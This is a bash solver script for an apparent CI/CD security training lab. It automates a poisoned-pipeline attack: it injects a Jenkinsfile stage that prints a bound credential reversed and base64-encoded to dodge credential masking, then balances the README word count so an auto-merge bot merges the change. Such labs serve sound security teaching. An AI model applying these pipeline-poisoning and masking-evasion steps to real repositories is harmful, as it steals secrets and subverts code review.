#!/bin/bash
# mock-turtle-solve: the lab's automated auto-merge-bypass solver and self-check (CICD-SEC-1,
# Insufficient Flow Control).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which can reach Gitea at
# gitea:3000 and Jenkins at 127.0.0.1:8080, and has git + curl). It walks the intended attack
# end-to-end and asserts it still works, so a learner whose box broke is told to reset it:
#
#   1. clone Wonderland/mock-turtle with the attacker's WRITE credentials (alice) and branch off main
#   2. POISON the Jenkinsfile: append a stage that binds the GLOBAL-scope flag10 credential and
#      `echo $TOKEN | rev | base64` (reverse-then-base64 so credential masking does not catch it)
#   3. BUMP the version (keeping its x.y.z structure) so the bot's structure + changed-file checks pass
#   4. BALANCE the word count: delete exactly as many words from the README as the payload added, so
#      the bot's "no net words" check passes (this is the bypass)
#   5. open a pull request (alice cannot push to main or merge; only the bot can)
#   6. let the auto-merge bot merge the crafted pull request into main, then await/trigger the main
#      build, which now runs the poisoned Jenkinsfile
#   7. read the main build's console and assert the exfiltrated (reversed-base64) flag is there
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated once the crafted pull request
# auto-merged, but NEVER prints the flag (that is the answer the player submits).
set -u

GITEA_HOST="gitea:3000"
GITEA="http://${GITEA_HOST}"
JENKINS="${MT_JENKINS_URL:-http://127.0.0.1:8080}"
ORG="Wonderland"
REPO="mock-turtle"
AUTOMERGE_JOB="mock-turtle-automerge"
MAIN_JOB="mock-turtle"

ATTACKER="alice:alice"          # the attacker: WRITE access, but cannot push/merge main
JAUTH="admin:admin"             # a Jenkins user who can read the build console
FLAG_FILE="${MT_FLAG_FILE:-/run/lab/casc_secrets/flag10}"
DEADLINE=$(( $(date +%s) + ${MT_DEADLINE:-480} ))

log()  { echo "mt-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the flag the credential store holds -----------------
# Read from the same file JCasC used; never printed. Modern Jenkins credential masking also masks
# the plain base64 of a bound secret, so the poisoned step reverses the value first:
# `echo $TOKEN | rev | base64`, i.e. base64 of "reverse(<flag>)\n". Reproduce exactly that and search
# the console for it.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s\n' "$FLAG" | rev | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"

jget()  { curl -s -m 10 -u "$JAUTH" "$@"; }
jcode() { curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$JAUTH" "$1"; }

# Trigger a Jenkins job build (with a crumb); best effort.
nudge() {  # $1 = job name
  local cj cr
  cj="$(mktemp)"
  cr="$(curl -s -m 10 -c "$cj" -u "$JAUTH" \
        "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22%3A%22,//crumb)" 2>/dev/null)"
  [ -n "$cr" ] && curl -s -m 10 -o /dev/null -b "$cj" -u "$JAUTH" -H "$cr" \
        -X POST "$JENKINS/job/$1/build" 2>/dev/null
  rm -f "$cj"
}

# --- 1. wait for Gitea's repo and both Jenkins jobs to be ready -----------------------------------
log "waiting for the mock-turtle repository on Gitea..."
until curl -s -m 10 -o /dev/null -w '%{http_code}' -u "$ATTACKER" \
        "$GITEA/api/v1/repos/$ORG/$REPO/branches/main" 2>/dev/null | grep -q '^200$'; do
  left || fail "the Gitea repository never became ready"; sleep 3
done

log "waiting for the Jenkins pipeline jobs to exist..."
until [ "$(jcode "$JENKINS/job/$MAIN_JOB/api/json")" = "200" ] \
   && [ "$(jcode "$JENKINS/job/$AUTOMERGE_JOB/api/json")" = "200" ]; do
  left || fail "the Jenkins jobs never appeared"; sleep 3
done

# --- 2. clone as alice, branch, craft the bypassing change ----------------------------------------
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
BR="mt-$(date +%s)-$$"
export GIT_TERMINAL_PROMPT=0 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null
export GIT_AUTHOR_NAME="alice" GIT_AUTHOR_EMAIL="alice@wonderland.example"
export GIT_COMMITTER_NAME="alice" GIT_COMMITTER_EMAIL="alice@wonderland.example"
REMOTE="http://$ATTACKER@$GITEA_HOST/$ORG/$REPO.git"

git clone -q "$REMOTE" "$WORK/repo" || fail "could not clone the repository (attacker write creds)"
cd "$WORK/repo" || fail "clone directory missing"
git checkout -q -b "$BR"

# 2a. Poison the Jenkinsfile: insert a stage that binds flag10 and exfiltrates it (reverse+base64).
#     A unique stage name keeps the pipeline valid even if main was poisoned on an earlier run.
PAYLOAD="$WORK/payload.txt"
cat > "$PAYLOAD" <<PAYLOAD_EOF
        stage('Publish $BR') {
            steps {
                withCredentials([usernamePassword(credentialsId: 'flag10', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
                    sh 'echo \$TOKEN | rev | base64'
                }
            }
        }
PAYLOAD_EOF
[ -f Jenkinsfile ] || fail "the repository has no Jenkinsfile"
sed "/stages {/r $PAYLOAD" Jenkinsfile > Jenkinsfile.new || fail "could not edit the Jenkinsfile"
mv Jenkinsfile.new Jenkinsfile
grep -q "Publish $BR" Jenkinsfile || fail "the payload stage was not inserted into the Jenkinsfile"

# 2b. Bump the version, keeping its x.y.z structure and NO trailing newline (the bot's check2).
[ -f version ] || fail "the repository has no version file"
CUR="$(cat version)"
MAJ="$(printf '%s' "$CUR" | cut -d. -f1)"
MIN="$(printf '%s' "$CUR" | cut -d. -f2)"
PAT="$(printf '%s' "$CUR" | cut -d. -f3)"
case "$MAJ$MIN$PAT" in *[!0-9]*|'') MAJ=1; MIN=0; PAT=11 ;; esac
PAT=$((PAT + 1)); [ "$PAT" -le 99 ] || { PAT=0; MIN=$((MIN + 1)); }
printf '%s' "$MAJ.$MIN.$PAT" > version
log "bumped version $CUR -> $MAJ.$MIN.$PAT"

# 2c. Measure the word imbalance EXACTLY as the auto-merge bot does, then delete that many single-word
#     lines from the README's keyword index so the net word count is zero (the bypass).
wordnet() {
  local p m
  p="$(git diff --word-diff=porcelain origin/main | grep -e "^+[^+]" | wc -w | xargs)"
  m="$(git diff --word-diff=porcelain origin/main | grep -e "^-[^-]" | wc -w | xargs)"
  echo "$((p - m))"
}
NET="$(wordnet)"
log "net words added by the payload (before balancing): $NET"
if [ "$NET" -gt 0 ]; then
  START="$(grep -n 'keyword-index:start' README.md | head -1 | cut -d: -f1)"
  [ -n "$START" ] || fail "could not find the README keyword index to balance the word count"
  END="$((START + NET))"
  AVAIL="$(( $(grep -n 'keyword-index:end' README.md | head -1 | cut -d: -f1) - START - 1 ))"
  [ "$NET" -le "$AVAIL" ] || fail "not enough keyword lines ($AVAIL) to balance $NET words"
  sed -i "$((START + 1)),${END}d" README.md || fail "could not trim the README to balance the word count"
elif [ "$NET" -lt 0 ]; then
  fail "unexpected negative net word count ($NET)"
fi

NET2="$(wordnet)"
log "net words added after balancing: $NET2"
[ "$NET2" -eq 0 ] || fail "could not balance the word count to zero (net=$NET2)"

git add -A
git commit -q -m "Bump version to $MAJ.$MIN.$PAT" || fail "nothing to commit"
git push -q "$REMOTE" "$BR" || fail "could not push the crafted branch (alice write creds)"
log "pushed crafted branch $BR"

# --- 3. open a pull request (alice can open it, but cannot merge it — only the bot can) ------------
PR_RESP="$(curl -s -m 15 -u "$ATTACKER" -X POST -H 'Content-Type: application/json' \
  -d "{\"head\":\"$BR\",\"base\":\"main\",\"title\":\"Bump version to $MAJ.$MIN.$PAT\"}" \
  "$GITEA/api/v1/repos/$ORG/$REPO/pulls" 2>/dev/null)"
PR_NUM="$(printf '%s' "$PR_RESP" | jq -r '.number // empty' 2>/dev/null)"
[ -n "$PR_NUM" ] || fail "could not open the pull request: $(printf '%s' "$PR_RESP" | tr -d '\n' | cut -c1-200)"
log "opened pull request #$PR_NUM"

# --- 4. let the auto-merge bot merge the crafted pull request into main ----------------------------
log "waiting for the auto-merge bot to merge PR #$PR_NUM into main..."
nudge "$AUTOMERGE_JOB"
merged=0; tries=0
while left; do
  state="$(curl -s -m 10 -u "$ATTACKER" "$GITEA/api/v1/repos/$ORG/$REPO/pulls/$PR_NUM" 2>/dev/null \
           | jq -r '.merged // false' 2>/dev/null)"
  if [ "$state" = "true" ]; then merged=1; log "PR #$PR_NUM was auto-merged into main"; break; fi
  tries=$((tries + 1))
  [ $(( tries % 6 )) -eq 0 ] && nudge "$AUTOMERGE_JOB"   # re-nudge the bot roughly every 30s
  sleep 5
done
[ "$merged" = "1" ] || fail "the auto-merge bot never merged the crafted pull request"

# --- 5. trigger/await the main build (now running the poisoned Jenkinsfile) and read the console ---
log "waiting for the main pipeline to run the poisoned Jenkinsfile and exfiltrate the flag..."
nudge "$MAIN_JOB"
tries=0
while left; do
  console="$(jget "$JENKINS/job/$MAIN_JOB/lastBuild/consoleText" 2>/dev/null)"
  if printf '%s' "$console" | grep -qF -- "$EXPECTED"; then
    log "OK: the crafted pull request bypassed the auto-merge bot (no net words + valid version"
    log "    bump), the bot merged it to main, and the main pipeline exfiltrated the Global-scope"
    log "    flag10 credential (${#FLAG} chars) to the build console as a reversed-base64 blob"
    log "    (flag itself not shown)."
    exit 0
  fi
  tries=$((tries + 1))
  [ $(( tries % 6 )) -eq 0 ] && nudge "$MAIN_JOB"   # re-nudge the main build roughly every 30s
  sleep 5
done

fail "the flag did not appear in the main pipeline console before the deadline"
